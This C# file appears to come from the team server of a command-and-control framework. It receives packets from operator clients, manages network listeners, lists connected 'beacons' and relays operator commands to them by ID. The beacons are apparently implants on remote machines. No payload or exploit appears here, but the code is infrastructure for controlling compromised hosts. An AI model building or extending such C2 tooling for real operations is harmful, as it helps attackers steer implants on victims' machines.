﻿using DataList.Client.Models;
using MPLib.MP;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using TeamServer.Beacon.Interface;
using TeamServer.Data;
using TeamServer.Services;

namespace TeamServer.HandlePacket
{
    internal static class CientPacketHandle
    { 
        public static async Task Read(byte[] data, ClientSession client)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytesUnsafe(data);

                //在Server只需要保存一下Beacon的基本信息，其余的信息直接发送给客户端处理，需要处理的包含：上线信息、活动窗口更新信息，这些处理之后也要发给客户端
                //客户端就只需要在第一次进行信息的同步，后续的信息都是增量更新
                string type = unpack_msgpack.ForcePathObject("Pac_ket").GetAsString();
                //Console.WriteLine($"[DEBUG] 处理客户端数据包，类型: {type}");
                switch (type)
                {
                    case "ClientPing":
                        {
                            if (client.Info != null)
                            {
                                client.Info.LastSeenTime = DateTime.UtcNow;
                            }
                            // 可选回包
                            // var pong = new MsgPack();
                            // pong.ForcePathObject("Pac_ket").SetAsString("ClientPong");
                            // client.SendAsync(pong.Encode2Bytes());
                            break;
                        }
                    case "ListenerManagement":
                        {
                            var action = unpack_msgpack.ForcePathObject("Action").GetAsString();
                            switch (action.ToUpper())
                            {
                                case "GET_SUPPORTED":
                                    await HandleGetSupportedListeners(unpack_msgpack, client);
                                    break;
                                case "GET_ACTIVE":
                                    await HandleGetActiveListeners(unpack_msgpack, client);
                                    break;
                                case "ADD":
                                    await HandleAddListener(unpack_msgpack, client);
                                    break;
                                case "REMOVE":
                                    await HandleRemoveListener(unpack_msgpack, client);
                                    break;
                                case "STOP":
                                    await HandleStopListener(unpack_msgpack, client);
                                    break;
                                case "START":
                                    await HandleStartListener(unpack_msgpack, client);
                                    break;
                                default:
                                    await SendErrorResponse(client, $"不支持的操作: {action}");
                                    break;
                            }
                            break;
                        }
                    case "GetBeaconList":
                        {
                            //Console.WriteLine("[+] Sending Beacon List to " + client.Info.IPProt);
                            //Console.WriteLine($"[DEBUG] BeaconList中有 {BeaconList.Beacons.Count} 个Beacon");
                            
                            // 输出每个Beacon的详细信息
                            for (int i = 0; i < BeaconList.Beacons.Count; i++)
                            {
                                var beacon = BeaconList.Beacons[i];
                                //Console.WriteLine($"[DEBUG] Beacon[{i}]: {beacon.Info.IPProt}");
                                //Console.WriteLine($"  - ID: {beacon.Info.Id}");
                                //Console.WriteLine($"  - Perfor_mance: {beacon.Info.Perfor_mance}");
                                //Console.WriteLine($"  - TG: {beacon.Info.tg}");
                                //Console.WriteLine($"  - WX: {beacon.Info.wx}");
                                //Console.WriteLine($"  - LastSeenTime: {beacon.Info.LastSeenTime}");
                            }
                            
                            string serializedData = BeaconList.Serialize();
                            //Console.WriteLine($"[DEBUG] 序列化数据长度: {serializedData.Length} 字符");
                            
                            MsgPack mp = new MsgPack();
                            mp.ForcePathObject("Pac_ket").SetAsString("BeaconList");
                            mp.ForcePathObject("Beacons").SetAsString(serializedData);
                            client.SendAsync(mp.Encode2Bytes());
                            break;
                        }
                    default:        //其余的全部直接转发给Beacon
                        {
                            string BeaconIds = unpack_msgpack.ForcePathObject("BID").GetAsString(); //获取多个ID用 | 分隔
                            string[] BeaconIdArray = BeaconIds.Split('|', StringSplitOptions.RemoveEmptyEntries);
                            //要先加上Client的id
                            unpack_msgpack.ForcePathObject("CID").SetAsString(client.Info.Id);
                            foreach (string beaconId in BeaconIdArray)//转发给多个Beacon
                            {
                                var beacon = BeaconList.Beacons.FirstOrDefault(b => b.Info.Id == beaconId);
                                if (beacon != null)
                                {
                                    beacon.SendAsync(unpack_msgpack.Encode2Bytes());
                                    LoggerService.Instance.Info($"{client.Info.Id}[C]>>>-->>>-->>>[B]{beaconId}");
                                }
                                else
                                {
                                    Console.WriteLine($"[-]转发失败：{beaconId}");
                                }
                            }

                            
                            break;
                        }
                        

                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] 处理客户端数据包时发生异常: {ex.Message}");

            }
        }

        #region 监听器管理方法

        /// <summary>
        /// 获取支持的监听器类型
        /// </summary>
        private static async Task HandleGetSupportedListeners(MsgPack msgPack, ClientSession session)
        {
            try
            {
                var supportedListeners = ListenerManager.SupportedListeners.Keys.ToArray();
                
                var response = new MsgPack();
                response.ForcePathObject("Pac_ket").SetAsString("ListenerManagement");
                response.ForcePathObject("Action").SetAsString("GET_SUPPORTED_RESPONSE");
                response.ForcePathObject("Success").SetAsInteger(1);
                response.ForcePathObject("Data").SetAsString(string.Join(",", supportedListeners));
                
                await session.SendAsync(response.Encode2Bytes());
                Console.WriteLine($"[+] 已发送支持的监听器类型: {string.Join(", ", supportedListeners)}");
            }
            catch (Exception ex)
            {
                await SendErrorResponse(session, $"获取支持的监听器类型失败: {ex.Message}");
            }
        }

        /// <summary>
        /// 获取活跃的监听器列表
        /// </summary>
        private static async Task HandleGetActiveListeners(MsgPack msgPack, ClientSession session)
        {
            try
            {
                var activeListeners = ListenerManager.Instance.GetActiveListeners();
                
                var response = new MsgPack();
                response.ForcePathObject("Pac_ket").SetAsString("ListenerManagement");
                response.ForcePathObject("Action").SetAsString("GET_ACTIVE_RESPONSE");
                response.ForcePathObject("Success").SetAsInteger(1);
                
                var listenersArray = new MsgPack();
                for (int i = 0; i < activeListeners.Count; i++)
                {
                    var listener = activeListeners[i];
                    var listenerPack = new MsgPack();
                    listenerPack.ForcePathObject("Type").SetAsString(listener.Type);
                    listenerPack.ForcePathObject("BindAddress").SetAsString(listener.BindAddress);
                    listenerPack.ForcePathObject("Port").SetAsInteger(listener.Port);
                    listenerPack.ForcePathObject("IsRunning").SetAsInteger(listener.IsRunning ? 1 : 0);
                    listenersArray.ForcePathObject(i.ToString()).SetAsString(Convert.ToBase64String(listenerPack.Encode2Bytes()));
                }
                response.ForcePathObject("Data").SetAsString(Convert.ToBase64String(listenersArray.Encode2Bytes()));
                
                await session.SendAsync(response.Encode2Bytes());
                Console.WriteLine($"[+] 已发送活跃监听器列表: {activeListeners.Count} 个");
            }
            catch (Exception ex)
            {
                await SendErrorResponse(session, $"获取活跃监听器失败: {ex.Message}");
            }
        }

        /// <summary>
        /// 添加监听器
        /// </summary>
        private static async Task HandleAddListener(MsgPack msgPack, ClientSession session)
        {
            try
            {
                var type = msgPack.ForcePathObject("Type").GetAsString();
                var bindAddress = msgPack.ForcePathObject("BindAddress").GetAsString();
                var port = msgPack.ForcePathObject("Port").GetAsInteger();

                if (string.IsNullOrEmpty(type) || string.IsNullOrEmpty(bindAddress) || port <= 0)
                {
                    await SendErrorResponse(session, "参数不完整");
                    return;
                }

                var success = await ListenerManager.Instance.AddListenerAsync(type, bindAddress, (int)port);
                
                var response = new MsgPack();
                response.ForcePathObject("Pac_ket").SetAsString("ListenerManagement");
                response.ForcePathObject("Action").SetAsString("ADD_RESPONSE");
                response.ForcePathObject("Success").SetAsInteger(success ? 1 : 0);
                response.ForcePathObject("Message").SetAsString(success ? "监听器添加成功" : "监听器添加失败");
                
                await session.SendAsync(response.Encode2Bytes());
                
                // 如果添加成功，主动推送更新后的监听器列表
                if (success)
                {
                    await BroadcastActiveListeners();
                }
            }
            catch (Exception ex)
            {
                await SendErrorResponse(session, $"添加监听器失败: {ex.Message}");
            }
        }

        /// <summary>
        /// 删除监听器
        /// </summary>
        private static async Task HandleRemoveListener(MsgPack msgPack, ClientSession session)
        {
            try
            {
                var type = msgPack.ForcePathObject("Type").GetAsString();
                var bindAddress = msgPack.ForcePathObject("BindAddress").GetAsString();
                var port = msgPack.ForcePathObject("Port").GetAsInteger();

                if (string.IsNullOrEmpty(type) || string.IsNullOrEmpty(bindAddress) || port <= 0)
                {
                    await SendErrorResponse(session, "参数不完整");
                    return;
                }

                var success = await ListenerManager.Instance.RemoveListenerAsync(type, bindAddress, (int)port);
                
                var response = new MsgPack();
                response.ForcePathObject("Pac_ket").SetAsString("ListenerManagement");
                response.ForcePathObject("Action").SetAsString("REMOVE_RESPONSE");
                response.ForcePathObject("Success").SetAsInteger(success ? 1 : 0);
                response.ForcePathObject("Message").SetAsString(success ? "监听器删除成功" : "监听器删除失败");
                
                await session.SendAsync(response.Encode2Bytes());
                
                // 如果删除成功，主动推送更新后的监听器列表
                if (success)
                {
                    await BroadcastActiveListeners();
                }
            }
            catch (Exception ex)
            {
                await SendErrorResponse(session, $"删除监听器失败: {ex.Message}");
            }
        }

        /// <summary>
        /// 停止监听器
        /// </summary>
        private static async Task HandleStopListener(MsgPack msgPack, ClientSession session)
        {
            try
            {
                var type = msgPack.ForcePathObject("Type").GetAsString();
                var bindAddress = msgPack.ForcePathObject("BindAddress").GetAsString();
                var port = msgPack.ForcePathObject("Port").GetAsInteger();

                if (string.IsNullOrEmpty(type) || string.IsNullOrEmpty(bindAddress) || port <= 0)
                {
                    await SendErrorResponse(session, "参数不完整");
                    return;
                }

                var success = await ListenerManager.Instance.StopListenerAsync(type, bindAddress, (int)port);
                
                var response = new MsgPack();
                response.ForcePathObject("Pac_ket").SetAsString("ListenerManagement");
                response.ForcePathObject("Action").SetAsString("STOP_RESPONSE");
                response.ForcePathObject("Success").SetAsInteger(success ? 1 : 0);
                response.ForcePathObject("Message").SetAsString(success ? "监听器停止成功" : "监听器停止失败");
                
                await session.SendAsync(response.Encode2Bytes());
                
                // 如果停止成功，主动推送更新后的监听器列表
                if (success)
                {
                    await BroadcastActiveListeners();
                }
            }
            catch (Exception ex)
            {
                await SendErrorResponse(session, $"停止监听器失败: {ex.Message}");
            }
        }

        /// <summary>
        /// 启动监听器
        /// </summary>
        private static async Task HandleStartListener(MsgPack msgPack, ClientSession session)
        {
            try
            {
                var type = msgPack.ForcePathObject("Type").GetAsString();
                var bindAddress = msgPack.ForcePathObject("BindAddress").GetAsString();
                var port = msgPack.ForcePathObject("Port").GetAsInteger();

                if (string.IsNullOrEmpty(type) || string.IsNullOrEmpty(bindAddress) || port <= 0)
                {
                    await SendErrorResponse(session, "参数不完整");
                    return;
                }

                var success = await ListenerManager.Instance.StartListenerAsync(type, bindAddress, (int)port);
                
                var response = new MsgPack();
                response.ForcePathObject("Pac_ket").SetAsString("ListenerManagement");
                response.ForcePathObject("Action").SetAsString("START_RESPONSE");
                response.ForcePathObject("Success").SetAsInteger(success ? 1 : 0);
                response.ForcePathObject("Message").SetAsString(success ? "监听器启动成功" : "监听器启动失败");
                
                await session.SendAsync(response.Encode2Bytes());
                
                // 如果启动成功，主动推送更新后的监听器列表
                if (success)
                {
                    await BroadcastActiveListeners();
                }
            }
            catch (Exception ex)
            {
                await SendErrorResponse(session, $"启动监听器失败: {ex.Message}");
            }
        }

        /// <summary>
        /// 发送错误响应
        /// </summary>
        private static async Task SendErrorResponse(ClientSession session, string errorMessage)
        {
            var response = new MsgPack();
            response.ForcePathObject("Pac_ket").SetAsString("ListenerManagement");
            response.ForcePathObject("Action").SetAsString("ERROR_RESPONSE");
            response.ForcePathObject("Success").SetAsInteger(0);
            response.ForcePathObject("Message").SetAsString(errorMessage);
            
            await session.SendAsync(response.Encode2Bytes());
        }

        /// <summary>
        /// 广播活跃监听器列表给所有客户端
        /// </summary>
        private static async Task BroadcastActiveListeners()
        {
            try
            {
                var activeListeners = ListenerManager.Instance.GetActiveListeners();
                
                var response = new MsgPack();
                response.ForcePathObject("Pac_ket").SetAsString("ListenerManagement");
                response.ForcePathObject("Action").SetAsString("GET_ACTIVE_RESPONSE");
                response.ForcePathObject("Success").SetAsInteger(1);
                
                var listenersArray = new MsgPack();
                for (int i = 0; i < activeListeners.Count; i++)
                {
                    var listener = activeListeners[i];
                    var listenerPack = new MsgPack();
                    listenerPack.ForcePathObject("Type").SetAsString(listener.Type);
                    listenerPack.ForcePathObject("BindAddress").SetAsString(listener.BindAddress);
                    listenerPack.ForcePathObject("Port").SetAsInteger(listener.Port);
                    listenerPack.ForcePathObject("IsRunning").SetAsInteger(listener.IsRunning ? 1 : 0);
                    listenersArray.ForcePathObject(i.ToString()).SetAsString(Convert.ToBase64String(listenerPack.Encode2Bytes()));
                }
                response.ForcePathObject("Data").SetAsString(Convert.ToBase64String(listenersArray.Encode2Bytes()));
                
                // 广播给所有客户端
                var clients = ClientList.Clients.ToList();
                foreach (var client in clients)
                {
                    try
                    {
                        await client.SendAsync(response.Encode2Bytes());
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[!] 广播监听器列表到客户端失败: {ex.Message}");
                    }
                }
                
                Console.WriteLine($"[+] 已广播监听器列表更新: {activeListeners.Count} 个");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] 广播监听器列表失败: {ex.Message}");
            }
        }

        #endregion
    }
}
